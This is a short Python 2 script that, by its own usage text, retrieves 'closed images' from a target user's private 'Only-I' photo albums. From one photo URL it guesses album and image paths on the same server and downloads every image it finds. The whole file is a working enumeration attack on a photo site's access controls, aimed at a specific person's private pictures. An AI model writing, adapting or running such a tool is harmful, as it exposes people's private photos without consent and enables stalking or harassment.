from urllib2 import urlopen
import sys

MAX_ALBUMS =10
MAX_FOTOS = 50

def info ():
    print """
        To get closed images you have to input into first argument the link to any foto of the target user album 'Only-I'
        for example:
            {} http://195.68.160.166/14/foto/d2/27/d22717ea/b_img8.jpg
        """.format( sys.argv[0])
def getfotos (link):
    print ("link is {0}".format(link))
    path,dummy,filename = link.rpartition('/')
    dummy,dummy,acc = path.partition(":")
    acc = "_".join(acc.split('/'))
    print ("Account : {0}".format(acc))
    filename,fileext = filename.split('.')
    path = path+'/'
    fileext = "."+fileext
    image = ""
    for i in range(len(filename)):
        if filename[i].isdigit():
            break
        image = image+filename[i]
    image = '/'+image
    print ("DEBUG : path = {0}, image = {1} ext = {2}".format(path,image,fileext)) 
    for i in range(MAX_ALBUMS):
        for j in range(MAX_FOTOS):
            filename = acc+'_album'+str(i+1)+'_image'+str(j+1)+fileext
            fileurl = path+'a'+str(i+1)+image+str(j+1)+fileext
            print("FILEURL = {0} FILENAME = {1}".format(fileurl,filename))
            try:
                data = urlopen(fileurl)
            except:
                continue
            info = data.info()
            if data.code != 200:
                continue
            if info.maintype != 'image':
                continue
            f = open(filename,'wb')
            f.write(data.read())
            f.close()



if __name__ == "__main__":
    if len(sys.argv) == 2:
        getfotos(sys.argv[1])
    else:
        info()


